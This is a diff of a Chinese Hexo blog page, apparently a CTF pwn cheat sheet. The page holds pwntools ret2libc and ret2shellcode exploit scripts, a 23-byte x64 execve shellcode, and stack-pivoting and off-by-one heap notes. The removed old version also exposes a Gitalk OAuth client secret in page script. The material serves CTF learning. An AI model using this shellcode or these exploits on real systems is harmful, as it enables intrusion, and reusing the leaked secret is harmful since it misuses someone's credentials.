@@ -1,14 +1,14 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
-  <link rel="icon" type="image/png" href="/img/logo.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
   <meta name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
@@ -17,29 +17,51 @@
   <meta name="description" content="">
   <meta name="author" content="Mr.BelieVe">
   <meta name="keywords" content="">
+  
   <title>pwn_by_examples - Mr.BelieVe&#39;s Treasure</title>
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
 
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
 
 <link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
 
 <!-- 自定义样式保持在最底部 -->
 
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.9-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Mr.BelieVe's Treasure" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -63,54 +85,84 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">分类</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/links/">友链</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
         
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -118,43 +170,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" parallax=true
+    <div class="banner" id="banner" parallax=true
          style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="pwn_by_examples">
               
             </span>
 
             
-              
-                <p class="mt-3 post-meta">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期二, 一月 28日 2020, 11:58 中午
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-01-28 11:58" pubdate>
+        2020年1月28日 中午
+      </time>
+    </span>
+  
+</div>
 
-              <p class="mt-1">
-                
-                  
-                  <span class="post-meta">
-                    <i class="far fa-chart-bar"></i>
-                    2.2k 字
-                  </span>
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
 
-                
-                  
-                  <span class="post-meta">
-                      <i class="far fa-clock"></i>
-                      8 分钟
-                  </span>
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
 
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -168,59 +230,49 @@
     
       
 
-<div class="container-fluid">
-  <div class="row">
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
     <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5 z-depth-3" id="board">
-          <div class="post-content mx-auto" id="post">
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pwn_by_examples</h1>
             
             <div class="markdown-body">
-              <h1 id="pwn-by-examples"><a href="#pwn-by-examples" class="headerlink" title="pwn_by_examples"></a>pwn_by_examples</h1><p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p>
+              <p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p>
 <h2 id="IDA部分"><a href="#IDA部分" class="headerlink" title="IDA部分"></a>IDA部分</h2><p>shift f12 字符串</p>
 <p>n 重命名</p>
 <p>x 查看引用</p>
-<h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><pre><code class="bash">cyclic 200 #生成循环 200个
-cyclic -l xxxxx #计算偏移</code></pre>
-<h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><pre><code>u64 
-asm 
-disasm </code></pre><pre><code class="python">from pwn import *
-sh = process(&#39;./ret2libc2&#39;)
-elf = ELF(&#39;./ret2libc2&#39;)
-rop = ROP(elf)
+<h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cyclic 200 <span class="hljs-comment">#生成循环 200个</span><br>cyclic -l xxxxx <span class="hljs-comment">#计算偏移</span><br></code></pre></td></tr></table></figure>
 
-payload = &#39;a&#39; * offset
-payload += p32(elf.plt[&#39;gets&#39;])
-payload += p32(rop.search(8).address)
-payload += p32(elf.bss() + 0x100)
-payload += p32(elf.plt[&#39;system&#39;])
-payload += p32(0)
-payload += p32(elf.bss() + 0x100)
-sh.sendline(payload)
 
-sh.sendline(&#39;/bin/sh\x00&#39;)
-sh.interactive()</code></pre>
+
+<h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">u64 <br><span class="hljs-keyword">asm</span> <br>disasm <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>rop = ROP(elf)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * offset<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>])<br>payload += p32(rop.search(<span class="hljs-number">8</span>).address)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>sh.sendline(payload)<br><br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
 <p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p>
 <h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p>
 <p>函数返回的时候esp会刚好指向返回地址的下一个地址</p>
-<img src="/2020/01/28/pwn_by_examples/image-20200125172524547.png" srcset="/img/loading.gif" class="" title="image-20200125172524547">
+<img src="/2020/01/28/pwn_by_examples/image-20200125172524547.png" srcset="/img/loading.gif" lazyload class="" title="image-20200125172524547">
 
 <hr>
 <blockquote>
-<p>作者：看雪学院<br>链接：<a href="https://www.jianshu.com/p/1bdac9837eff" target="_blank" rel="noopener">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p>
+<p>作者：看雪学院<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1bdac9837eff">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p>
 </blockquote>
 <h2 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h2><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p>
 <p>pwn5（参考“阅读原文”）</p>
 <p>继续前面的套路。</p>
 <p><strong>第一步，查看保护</strong></p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p>
 <p><strong>第二步，判断漏洞函数。</strong></p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>发现函数是read，仅仅读取0x40（64）个字节。</p>
 <p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>EBP的内容为：0x3761413661413561</p>
 <blockquote>
 <p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p>
@@ -234,11 +286,11 @@ sh.interactive()</code></pre>
 <p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p>
 <p>如system，execve等</p>
 <p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p>
 <blockquote>
 <p># 23 bytes</p>
-<p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p>
+<p># <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p>
 <p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
 </blockquote>
 <p>它的汇编形式是：</p>
@@ -268,15 +320,15 @@ sh.interactive()</code></pre>
 <p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p>
 <p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p>
 <p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" srcset="/img/loading.gif" alt="img"></p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p>
 <p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p>
 <blockquote>
 <p>from pwn import *</p>
 <p>code = ELF(‘./pwn5’)</p>
 <p># 23 bytes</p>
-<p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p>
+<p># <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p>
 <p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
 <p>sh.recvuntil(‘[‘)</p>
 <p>buf_addr = sh.recvuntil(‘]’, drop=True)</p>
@@ -286,24 +338,24 @@ sh.interactive()</code></pre>
 <p>sh.interactive()</p>
 </blockquote>
 <p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>第二题（控制esp进行精准打击）</p>
 <p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p>
 <p>pwn6（参考“阅读原文”）</p>
 <p>继续前面的过程：</p>
 <p><strong>第一步：检测保护情况</strong></p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p>
 <p><strong>第二步，判断漏洞函数</strong></p>
 <p>如gets,scanf等：</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>发现是fgets函数，仅仅读取50个字节的字符长度。</p>
 <p><strong>第三步</strong></p>
 <p>计算目标变量的在堆栈中距离ebp的偏移。</p>
 <p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p>
 <p><strong>第四步和第五步</strong></p>
 <p>分析是否已经载入了可以利用的函数。发现并没有：</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <blockquote>
 <p>$ ROPgadget –binary stack_pivoting_1 –string ‘/bin/sh’</p>
 <p>Strings information</p>
@@ -314,7 +366,7 @@ sh.interactive()</code></pre>
 <p>那么怎么办呢？</p>
 <p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p>
 <p>这里，我先放图出来解释一下思路：</p>
-<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p>
 <p>推算shellcode放置的地址</p>
 <p>跳转到shellcode放置的位置</p>
@@ -362,105 +414,107 @@ sh.interactive()</code></pre>
 <h3 id="off-by-one-漏洞"><a href="#off-by-one-漏洞" class="headerlink" title="off by one 漏洞"></a>off by one 漏洞</h3><p><strong>要使用off by one，malloc大小不能是16的倍数（64位情况下）</strong></p>
 <p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p>
 <p>能够修改下一块chunk的size字段，这种情况一般被称为堆扩展技术</p>
-<img src="/2020/01/28/pwn_by_examples/image-20200126175331744.png" srcset="/img/loading.gif" class="" title="image-20200126175331744">
+<img src="/2020/01/28/pwn_by_examples/image-20200126175331744.png" srcset="/img/loading.gif" lazyload class="" title="image-20200126175331744">
 
-<img src="/2020/01/28/pwn_by_examples/image-20200126175341238.png" srcset="/img/loading.gif" class="" title="image-20200126175341238">
+<img src="/2020/01/28/pwn_by_examples/image-20200126175341238.png" srcset="/img/loading.gif" lazyload class="" title="image-20200126175341238">
 
-<img src="/2020/01/28/pwn_by_examples/image-20200126181904887.png" srcset="/img/loading.gif" class="" title="image-20200126181904887">
+<img src="/2020/01/28/pwn_by_examples/image-20200126181904887.png" srcset="/img/loading.gif" lazyload class="" title="image-20200126181904887">
             </div>
             <hr>
             <div>
-              <p>
+              <div class="post-metas mb-3">
                 
-                  <span>
-                <i class="iconfont icon-inbox"></i>
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
                     
                       <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                      &nbsp;
                     
                       <a class="hover-with-bg" href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>
-                      &nbsp;
                     
                       <a class="hover-with-bg" href="/categories/CTF/%E6%95%99%E7%A8%8B/">教程</a>
-                      &nbsp;
                     
-                  </span>&nbsp;&nbsp;
+                  </div>
                 
                 
-              </p>
+              </div>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
               
               
-                <div class="post-prevnext row">
-                  <div class="post-prev col-6">
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
                     
                     
                       <a href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/">
-                        <i class="fa fa-chevron-left"></i>
+                        <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">BrainOverFlow_Vol.1_BUU特供</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
-                  </div>
-                  <div class="post-next col-6">
+                  </article>
+                  <article class="post-next col-6">
                     
                     
                       <a href="/2020/01/28/Hgame/">
                         <span class="hidden-mobile">Hgame</span>
                         <span class="visible-mobile">下一篇</span>
-                        <i class="fa fa-chevron-right"></i>
+                        <i class="iconfont icon-arrowright"></i>
                       </a>
                     
-                  </div>
+                  </article>
                 </div>
               
             </div>
 
-              
-                <!-- Comments -->
-                <div class="comments" id="comments">
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
                   
-                  
-  <div id="gitalk-container"></div>
-  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-  <script defer src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-  <script defer src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.11.1/js/md5.min.js"></script>
+                
+                
   <script type="text/javascript">
-    var oldLoad = window.onload;
-    window.onload = function () {
-      var gitalk = new Gitalk({
-        clientID: 'c16704b33f7cc977ea90',
-        clientSecret: '9f8ad5600be82be115466ef0daf0f8a24a7b2da1',
-        repo: 'mrbelieve128.github.io',
-        owner: 'mrbelieve128',
-        admin: 'mrbelieve128',
-        id: md5(location.pathname),
-        language: 'zh-CN',
-        perPage: 15,
-        pagerDirection: 'last',
-        createIssueManually: 'false',
-        distractionFreeMode: 'false'
-      });
-
-      gitalk.render('gitalk-container')
-      oldLoad && oldLoad();
-    }
+    Fluid.utils.lazyComments('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'mrbelieve128/mrbelieve128.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
   </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
 
 
-                </div>
-              
-          </div>
+              </article>
+            
+          </article>
         </div>
       </div>
     </div>
     
       <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc-start"></div>
-<div id="toc">
-  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
 
       </div>
@@ -472,16 +526,15 @@ sh.interactive()</code></pre>
 
 
     
-  </main>
 
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
      aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
@@ -502,123 +555,103 @@ sh.interactive()</code></pre>
     </div>
   </div>
 </div>
-  
-
-  
-
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    </div>
     
-  <div>
+
     
-      <!-- 不蒜子统计PV -->
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
       
-      <span id="busuanzi_container_site_pv" style="display: none">
-      总访问量 <span id="busuanzi_value_site_pv"></span> 次
-    </span>
-    
-    
-      <!-- 不蒜子统计UV -->
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
       
-      <span id="busuanzi_container_site_uv" style="display: none">
-      总访客数 <span id="busuanzi_value_site_uv"></span> 人
-    </span>
+      
+        <!-- 不蒜子统计UV -->
